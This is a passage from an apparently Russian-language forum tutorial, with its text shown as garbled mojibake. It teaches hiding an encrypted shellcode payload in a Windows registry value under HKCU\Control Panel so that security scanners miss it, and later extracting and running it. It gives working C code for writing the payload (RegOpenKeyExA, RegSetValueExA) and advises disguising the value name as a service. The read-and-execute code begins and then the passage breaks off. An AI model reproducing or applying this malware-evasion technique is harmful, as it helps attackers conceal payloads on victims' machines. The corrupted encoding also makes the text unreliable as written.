–í–º–µ—Å—Ç–æ —ç—Ç–æ–≥–æ payload –º–æ–∂–µ—Ç –±—ã—Ç—å –ø–æ–ª—É—á–µ–Ω –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–π –ø—Ä–æ–≥—Ä–∞–º–º—ã. –í —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ –±—É–¥–µ—Ç –ø–æ–∫–∞–∑–∞–Ω–∞ –ø–æ—Ö–æ–∂–∞—è —Ç–µ—Ö–Ω–∏–∫–∞, —Ç–æ–ª—å–∫–æ payload –±—É–¥–µ—Ç –∑–∞–ø–∏—Å–∞–Ω –≤ –∫–∞—á–µ—Å—Ç–≤–µ –∑–Ω–∞—á–µ–Ω–∏—è –∫–ª—é—á–∞ —Ä–µ–µ—Å—Ç—Ä–∞ –∏ –∏–∑–≤–ª–µ—á–µ–Ω –∏–∑ —Ä–µ–µ—Å—Ç—Ä–∞ –ø—Ä–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏.<br />
–¢–∞–∫ –∫–∞–∫ payload –±—É–¥–µ—Ç —Ö—Ä–∞–Ω–∏—Ç—å—Å—è –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –ø—Ä–∏ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–∏ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–π –ø—Ä–æ–≥—Ä–∞–º–º—ã —Å–∏—Å—Ç–µ–º–∞–º–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –æ–Ω–∏ –Ω–µ —Å–º–æ–≥—É—Ç –æ–±–Ω–∞—Ä—É–∂–∏—Ç—å –∏–ª–∏ –Ω–∞–π—Ç–∏ payload –≤–Ω—É—Ç—Ä–∏.<br />
<br />
–ö–æ–¥ –≤ —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ —Ä–∞–∑–¥–µ–ª–µ–Ω –Ω–∞ –¥–≤–µ —á–∞—Å—Ç–∏. –ü–µ—Ä–≤–∞—è —á–∞—Å—Ç—å –∑–∞–ø–∏—Å—ã–≤–∞–µ—Ç –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–π payload –≤ –∫–ª—é—á —Ä–µ–µ—Å—Ç—Ä–∞. –í—Ç–æ—Ä–∞—è —á–∞—Å—Ç—å —Å—á–∏—Ç—ã–≤–∞–µ—Ç payload –∏–∑ —Ç–æ–≥–æ –∂–µ –∫–ª—é—á–∞ —Ä–µ–µ—Å—Ç—Ä–∞, —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤—ã–≤–∞–µ—Ç –µ–≥–æ –∏ –≤—ã–ø–æ–ª–Ω—è–µ—Ç.<br />
–í —Å—Ç–∞—Ç—å–µ –Ω–µ –±—É–¥–µ—Ç –æ–±—ä—è—Å–Ω—è—Ç—å—Å—è –ø—Ä–æ—Ü–µ—Å—Å —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è/—Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è, —Ç–∞–∫ –∫–∞–∫ —ç—Ç–æ –±—ã–ª–æ –æ–±—ä—è—Å–Ω–µ–Ω–æ –≤ –ø—Ä–µ–¥—ã–¥—É—â–∏—Ö —É—Ä–æ–∫–∞—Ö.<br />
<br />
–¢–∞–∫–∂–µ –º—ã –±—É–¥–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —É—Å–ª–æ–≤–Ω—É—é –∫–æ–º–ø–∏–ª—è—Ü–∏—é<br />
<br />
<b>–£—Å–ª–æ–≤–Ω–∞—è –ö–æ–º–ø–∏–ª—è—Ü–∏—è</b><br />
<br />
–£—Å–ª–æ–≤–Ω–∞—è –∫–æ–º–ø–∏–ª—è—Ü–∏—è - —ç—Ç–æ —Å–ø–æ—Å–æ–± –≤–∫–ª—é—á–∞—Ç—å –∫–æ–¥ –≤ –ø—Ä–æ–µ–∫—Ç, –∫–æ—Ç–æ—Ä—ã–π –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä –ª–∏–±–æ –±—É–¥–µ—Ç –∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞—Ç—å, –ª–∏–±–æ –Ω–µ –±—É–¥–µ—Ç.<br />
<br />
–î–≤–µ –Ω–∏–∂–µ –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω—ã–µ —Å–µ–∫—Ü–∏–∏ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è—é—Ç –±–∞–∑–æ–≤—ã–π –∫–æ–¥, –¥–ª—è –ø–æ–Ω–∏–º–∞–Ω–∏—è –∫–∞–∫ –±—É–¥—É—Ç –Ω–∞–ø–∏—Å–∞–Ω—ã –æ–ø–µ—Ä–∞—Ü–∏–∏ —á—Ç–µ–Ω–∏—è –∏ –∑–∞–ø–∏—Å–∏ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —É—Å–ª–æ–≤–Ω–æ–π –∫–æ–º–ø–∏–ª—è—Ü–∏–∏.<br />
<br />
<b>–û–ø–µ—Ä–∞—Ü–∏—è –∑–∞–ø–∏—Å–∏</b><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define WRITEMODE // –ö–æ–¥, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç —Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω –≤ —Å–ª—É—á–∞–µ –µ—Å–ª–∏ –Ω—É–∂–Ω–æ –∑–∞–ø–∏—Å–∞—Ç—å –¥–∞–Ω–Ω—ã–µ –≤ —Ä–µ–µ—Å—Ç—Ä

// –µ—Å–ª–∏ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ &#039;WRITEMODE&#039;
#ifdef WRITEMODE
    // –ö–æ–¥, –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–π –¥–ª—è –∑–∞–ø–∏—Å–∏ payload –≤ —Ä–µ–µ—Å—Ç—Ä
#endif
#ifdef READMODE // –ö–æ–¥, –∫–æ—Ç–æ—Ä—ã–π –ù–ï –±—É–¥–µ—Ç —Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω
#endif</code></pre>
	</div>
</div><br />
<b>–û–ø–µ—Ä–∞—Ü–∏—è —á—Ç–µ–Ω–∏—è</b><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define READMODE // –ö–æ–¥, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç —Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω –≤ —Å–ª—É—á–∞–µ –µ—Å–ª–∏ –Ω—É–∂–Ω–æ —Å—á–∏—Ç–∞—Ç—å –¥–∞–Ω–Ω—ã–µ –∏–∑ —Ä–µ–µ—Å—Ç—Ä–∞

// –µ—Å–ª–∏ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ &#039;READMODE&#039;
#ifdef READMODE
    // –ö–æ–¥, –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–π –¥–ª—è —á—Ç–µ–Ω–∏—è payload –∏–∑ —Ä–µ–µ—Å—Ç—Ä–∞
#endif
#ifdef WRITEMODE // –ö–æ–¥, –∫–æ—Ç–æ—Ä—ã–π –ù–ï –±—É–¥–µ—Ç —Å–∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞–Ω
#endif</code></pre>
	</div>
</div><br />
<b>–ó–∞–ø–∏—Å—å –≤ —Ä–µ–µ—Å—Ç—Ä</b><br />
<br />
–≠—Ç–æ—Ç —Ä–∞–∑–¥–µ–ª —Ä–∞—Å—Å–∫–∞–∂–µ—Ç –æ —Ñ—É–Ω–∫—Ü–∏–∏ WriteShellcodeToRegistry. –§—É–Ω–∫—Ü–∏—è –ø—Ä–∏–Ω–∏–º–∞–µ—Ç –¥–≤–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞:<br />
<br />
pShellcode - Payload –¥–ª—è –∑–∞–ø–∏—Å–∏.<br />
<br />
dwShellcodeSize - –†–∞–∑–º–µ—Ä –∑–∞–ø–∏—Å—ã–≤–∞–µ–º–æ–≥–æ payload.<br />
<br />
<b>REGISTRY &amp; REGSTRING</b><br />
<br />
–ö–æ–¥ –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å –¥–≤—É—Ö –ø—Ä–µ–¥–æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã—Ö –∫–æ–Ω—Å—Ç–∞–Ω—Ç REGISTRY –∏ REGSTRING, –∫–æ—Ç–æ—Ä—ã–µ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—é—Ç—Å—è –Ω–∞ Control Panel –∏ Ru-SferaPW —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ.<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –ö–ª—é—á —Ä–µ–µ—Å—Ç—Ä–∞ –¥–ª—è —á—Ç–µ–Ω–∏—è/–∑–∞–ø–∏—Å–∏
#define REGISTRY &quot;Control Panel&quot;
#define REGSTRING &quot;RuSferaPW&quot;</code></pre>
	</div>
</div><br />
REGISTRY - —ç—Ç–æ –∏–º—è –∫–ª—é—á–∞ —Ä–µ–µ—Å—Ç—Ä–∞, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å payload.<br />
–ü–æ–ª–Ω—ã–π –ø—É—Ç—å REGISTRY –±—É–¥–µ—Ç —Ç–∞–∫–æ–π Computer\HKEY_CURRENT_USER\Control Panel.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746780741224.png"
		data-src="https://osint42.org/attachments/1746780741224-png.107/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780741224-png.107/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780741224.png"
			title="1746780741224.png"
			width="1166" height="521" loading="lazy" />
	</div><br />
<br />
–¢–æ, —á—Ç–æ —Ñ—É–Ω–∫—Ü–∏—è –±—É–¥–µ—Ç –¥–µ–ª–∞—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ, - —ç—Ç–æ —Å–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤–æ–≥–æ –∑–Ω–∞—á–µ–Ω–∏—è —Å—Ç—Ä–æ–∫–∏ –ø–æ–¥ —ç—Ç–∏–º –∫–ª—é—á–æ–º —Ä–µ–µ—Å—Ç—Ä–∞ –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è payload.<br />
REGSTRING ‚Äî —ç—Ç–æ –∏–º—è —Å–æ–∑–¥–∞–≤–∞–µ–º–æ–≥–æ –∑–Ω–∞—á–µ–Ω–∏—è —Å—Ç—Ä–æ–∫–∏. –û—á–µ–≤–∏–¥–Ω–æ, —á—Ç–æ –≤ —Ä–µ–∞–ª—å–Ω–æ–π —Å–∏—Ç—É–∞—Ü–∏–∏ —Å—Ç–æ–∏—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–æ–ª–µ–µ —Ä–µ–∞–ª–∏—Å—Ç–∏—á–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ, —Ç–∞–∫–æ–µ –∫–∞–∫ PanelUpdateService –∏–ª–∏ AppSnapshot.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746780748744.png"
		data-src="https://osint42.org/attachments/1746780748744-png.108/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746780748744-png.108/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746780748744.png"
			title="1746780748744.png"
			width="547" height="239" loading="lazy" />
	</div><br />
<br />
<b>–û—Ç–∫—Ä—ã—Ç–∏–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ –¥–ª—è –∫–ª—é—á–∞ —Ä–µ–µ—Å—Ç—Ä–∞</b><br />
<br />
–ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è WinAPI —Ñ—É–Ω–∫—Ü–∏—è RegOpenKeyExA –¥–ª—è –æ—Ç–∫—Ä—ã—Ç–∏—è –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ –∫ —É–∫–∞–∑–∞–Ω–Ω–æ–º—É –∫–ª—é—á—É —Ä–µ–µ—Å—Ç—Ä–∞. –≠—Ç–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è, —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –∏–ª–∏ —É–¥–∞–ª–µ–Ω–∏—è –∑–Ω–∞—á–µ–Ω–∏–π –≤ –∫–ª—é—á–µ —Ä–µ–µ—Å—Ç—Ä–∞.<br />
<br />
–§—É–Ω–∫—Ü–∏—è RegOpenKeyExA:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>LSTATUS RegOpenKeyExA(
  [in]           HKEY   hKey,              // –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –æ—Ç–∫—Ä—ã—Ç–æ–≥–æ –∫–ª—é—á–∞ —Ä–µ–µ—Å—Ç—Ä–∞
  [in, optional] LPCSTR lpSubKey,          // –ò–º—è –æ—Ç–∫—Ä—ã–≤–∞–µ–º–æ–≥–æ –ø–æ–¥–∫–ª—é—á–∞ —Ä–µ–µ—Å—Ç—Ä–∞ (–∫–æ–Ω—Å—Ç–∞–Ω—Ç–∞ REGISTRY)
  [in]           DWORD  ulOptions,          // –û–ø—Ü–∏–∏ –ø—Ä–∏ –æ—Ç–∫—Ä—ã—Ç–∏–∏ –∫–ª—é—á–∞ - –£—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –≤ 0
  [in]           REGSAM samDesired,          // –ü—Ä–∞–≤–∞ –¥–æ—Å—Ç—É–ø–∞
  [out]          PHKEY  phkResult          // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é, –∫–æ—Ç–æ—Ä–∞—è –ø–æ–ª—É—á–∞–µ—Ç –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –æ—Ç–∫—Ä—ã—Ç–æ–≥–æ –∫–ª—é—á–∞
);</code></pre>
	</div>
</div><br />
–ß–µ—Ç–≤–µ—Ä—Ç—ã–π –ø–∞—Ä–∞–º–µ—Ç—Ä RegOpenKeyExA –æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç –ø—Ä–∞–≤–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–ª—é—á—É —Ä–µ–µ—Å—Ç—Ä–∞. –¢–∞–∫ –∫–∞–∫ –ø—Ä–æ–≥—Ä–∞–º–º–∞ –¥–æ–ª–∂–Ω–∞ —Å–æ–∑–¥–∞—Ç—å –∑–Ω–∞—á–µ–Ω–∏–µ –≤ –∫–ª—é—á–µ —Ä–µ–µ—Å—Ç—Ä–∞, –≤—ã–±—Ä–∞–Ω–æ KEY_SET_VALUE. –ü–æ–ª–Ω—ã–π —Å–ø–∏—Å–æ–∫ –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞ –∫ —Ä–µ–µ—Å—Ç—Ä—É –º–æ–∂–Ω–æ –Ω–∞–π—Ç–∏ –≤ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–∏ Microsoft.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &amp;hKey);</code></pre>
	</div>
</div><br />
<b>–£—Å—Ç–∞–Ω–æ–≤–∫–∞ –∑–Ω–∞—á–µ–Ω–∏—è —Ä–µ–µ—Å—Ç—Ä–∞</b><br />
<br />
–î–∞–ª–µ–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —Ñ—É–Ω–∫—Ü–∏—è WinAPI RegSetValueExA, –∫–æ—Ç–æ—Ä–∞—è –ø—Ä–∏–Ω–∏–º–∞–µ—Ç –æ—Ç–∫—Ä—ã—Ç—ã–π –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –∏–∑ RegOpenKeyExA –∏ —Å–æ–∑–¥–∞–µ—Ç –Ω–æ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –Ω–∞ –æ—Å–Ω–æ–≤–µ –≤—Ç–æ—Ä–æ–≥–æ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞, REGSTRING. –û–Ω–∞ —Ç–∞–∫–∂–µ –∑–∞–ø–∏—Å—ã–≤–∞–µ—Ç payload –≤ —Ç–æ–ª—å–∫–æ —á—Ç–æ —Å–æ–∑–¥–∞–Ω–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ.<br />
<br />
–§—É–Ω–∫—Ü–∏—è RegSetValueExA:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>LSTATUS RegSetValueExA(
  [in]           HKEY       hKey,         // –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –æ—Ç–∫—Ä—ã—Ç–æ–≥–æ –∫–ª—é—á–∞ —Ä–µ–µ—Å—Ç—Ä–∞
  [in, optional] LPCSTR     lpValueName,  // –ò–º—è —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º–æ–≥–æ –∑–Ω–∞—á–µ–Ω–∏—è (–∫–æ–Ω—Å—Ç–∞–Ω—Ç–∞ REGSTRING)
                 DWORD      Reserved,     // –£—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –≤ 0
  [in]           DWORD      dwType,       // –¢–∏–ø –¥–∞–Ω–Ω—ã—Ö, –Ω–∞ –∫–æ—Ç–æ—Ä—ã–π —É–∫–∞–∑—ã–≤–∞–µ—Ç –ø–∞—Ä–∞–º–µ—Ç—Ä lpData
  [in]           const BYTE *lpData,      // –î–∞–Ω–Ω—ã–µ –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è
  [in]           DWORD      cbData        // –†–∞–∑–º–µ—Ä –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏, –Ω–∞ –∫–æ—Ç–æ—Ä—É—é —É–∫–∞–∑—ã–≤–∞–µ—Ç –ø–∞—Ä–∞–º–µ—Ç—Ä lpData, –≤ –±–∞–π—Ç–∞—Ö
);</code></pre>
	</div>
</div><br />
–¢–∞–∫–∂–µ —Å—Ç–æ–∏—Ç –æ—Ç–º–µ—Ç–∏—Ç—å, —á—Ç–æ —á–µ—Ç–≤–µ—Ä—Ç—ã–π –ø–∞—Ä–∞–º–µ—Ç—Ä –æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç —Ç–∏–ø –¥–∞–Ω–Ω—ã—Ö –¥–ª—è –∑–Ω–∞—á–µ–Ω–∏—è —Ä–µ–µ—Å—Ç—Ä–∞. –í —ç—Ç–æ–º —Å–ª—É—á–∞–µ –æ–Ω —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –Ω–∞ REG_BINARY, —Ç–∞–∫ –∫–∞–∫ payload –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π –ø—Ä–æ—Å—Ç–æ —Å–ø–∏—Å–æ–∫ –±–∞–π—Ç–æ–≤. –ü–æ–ª–Ω—ã–π —Å–ø–∏—Å–æ–∫ —Ç–∏–ø–æ–≤ –¥–∞–Ω–Ω—ã—Ö –º–æ–∂–Ω–æ –Ω–∞–π—Ç–∏ –≤ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–∏ Microsoft.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>STATUS = RegSetValueExA(hKey, REGSTRING, 0, REG_BINARY, pShellcode, dwShellcodeSize);</code></pre>
	</div>
</div><br />
<b>–ó–∞–∫—Ä—ã—Ç–∏–µ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ –∫–ª—é—á–∞ —Ä–µ–µ—Å—Ç—Ä–∞</b><br />
<br />
–ù–∞–∫–æ–Ω–µ—Ü, –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è RegCloseKey –¥–ª—è –∑–∞–∫—Ä—ã—Ç–∏—è –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ –∫–ª—é—á–∞ —Ä–µ–µ—Å—Ç—Ä–∞, –∫–æ—Ç–æ—Ä—ã–π –±—ã–ª –æ—Ç–∫—Ä—ã—Ç.<br />
<br />
–§—É–Ω–∫—Ü–∏—è RegCloseKey:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>LSTATUS RegCloseKey(
  [in] HKEY hKey // –î–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –æ—Ç–∫—Ä—ã—Ç–æ–≥–æ –∫–ª—é—á–∞ —Ä–µ–µ—Å—Ç—Ä–∞, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç –∑–∞–∫—Ä—ã—Ç
);</code></pre>
	</div>
</div><br />
<b>–ó–∞–ø–∏—Å—å –≤ —Ä–µ–µ—Å—Ç—Ä</b><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL WriteShellcodeToRegistry(IN PBYTE pShellcode, IN DWORD dwShellcodeSize) {

    BOOL        bSTATE  = TRUE;
    LSTATUS     STATUS  = NULL;
    HKEY        hKey    = NULL;

    printf(&quot;[i] –ó–∞–ø–∏—Å—å 0x%p [ –†–∞–∑–º–µ—Ä: %ld ] –≤ \&quot;%s\\%s\&quot; ... &quot;, pShellcode, dwShellcodeSize, REGISTRY, REGSTRING);

    STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &amp;hKey);
    if (ERROR_SUCCESS != STATUS) {
        printf(&quot;[!] –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–∫—Ä—ã—Ç–∏–∏ –∫–ª—é—á–∞ RegOpenKeyExA: %d\n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    STATUS = RegSetValueExA(hKey, REGSTRING, 0, REG_BINARY, pShellcode, dwShellcodeSize);
    if (ERROR_SUCCESS != STATUS){
        printf(&quot;[!] –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø–∏—Å–∏ RegSetValueExA: %d\n&quot;, STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    printf(&quot;[+] –ì–æ—Ç–æ–≤–æ ! \n&quot;);


_EndOfFunction:
    if (hKey)
        RegCloseKey(hKey);
    return bSTATE;
}</code></pre>
	</div>
</div><br />
<b>–ß—Ç–µ–Ω–∏–µ –∏–∑ —Ä–µ–µ—Å—Ç—Ä–∞</b><br />
<br />
–¢–µ–ø–µ—Ä—å, –∫–æ–≥–¥–∞ payload –∑–∞–ø–∏—Å–∞–Ω –≤ —Å—Ç—Ä–æ–∫–æ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ RuSferaPw –≤–Ω—É—Ç—Ä–∏ –∫–ª—é—á–∞ —Ä–µ–µ—Å—Ç—Ä–∞ Computer\HKEY_CURRENT_USER\Control Panel, –ø—Ä–∏—à–ª–æ –≤—Ä–µ–º—è –Ω–∞–ø–∏—Å–∞—Ç—å –¥—Ä—É–≥—É—é —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—é, –∫–æ—Ç–æ—Ä–∞—è –±—É–¥–µ—Ç —Å—á–∏—Ç—ã–≤–∞—Ç—å —ç—Ç–æ –∑–Ω–∞—á–µ–Ω–∏–µ –≤ —Ä–µ–µ—Å—Ç—Ä–µ –∏ –∑–∞–ø—É—Å–∫–∞—Ç—å PayLoad.<br />
<br />
–≠—Ç–æ—Ç —Ä–∞–∑–¥–µ–ª —Ä–∞—Å—Å–∫–∞–∂–µ—Ç –æ —Ñ—É–Ω–∫—Ü–∏–∏ ReadShellcodeFromRegistry (–ø–æ–∫–∞–∑–∞–Ω–Ω–æ–π –Ω–∏–∂–µ).<br />
<br />
–§—É–Ω–∫—Ü–∏—è –ø—Ä–∏–Ω–∏–º–∞–µ—Ç –¥–≤–∞ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞:<br />
<br />
sPayloadSize - –†–∞–∑–º–µ—Ä payload, –∫–æ—Ç–æ—Ä—ã–π –Ω—É–∂–Ω–æ –ø—Ä–æ—á–∏—Ç–∞—Ç—å.<br />
ppPayload - –ë—É—Ñ–µ—Ä, –≤ –∫–æ—Ç–æ—Ä–æ–º –±—É–¥–µ—Ç —Ö—Ä–∞–Ω–∏—Ç—å—Å—è –ø–æ–ª—É—á–µ–Ω–Ω—ã–π payload.<br />
<br />
<b>–í—ã–¥–µ–ª–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏</b><br />
<br />
–§—É–Ω–∫—Ü–∏—è –Ω–∞—á–∏–Ω–∞–µ—Ç —Å –≤—ã–¥–µ–ª–µ–Ω–∏—è –ø–∞–º—è—Ç–∏ —Ä–∞–∑–º–µ—Ä–æ–º sPayloadSize, –≤ –∫–æ—Ç–æ—Ä–æ–π –±—É–¥–µ—Ç —Ö—Ä–∞–Ω–∏—Ç—å—Å—è payload.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sPayloadSize);</code></pre>
	</div>
</div><br />
<b>–ß—Ç–µ–Ω–∏–µ –∑–Ω–∞—á–µ–Ω–∏—è –∏–∑ —Ä–µ–µ—Å—Ç—Ä–∞</b><br />
<br />
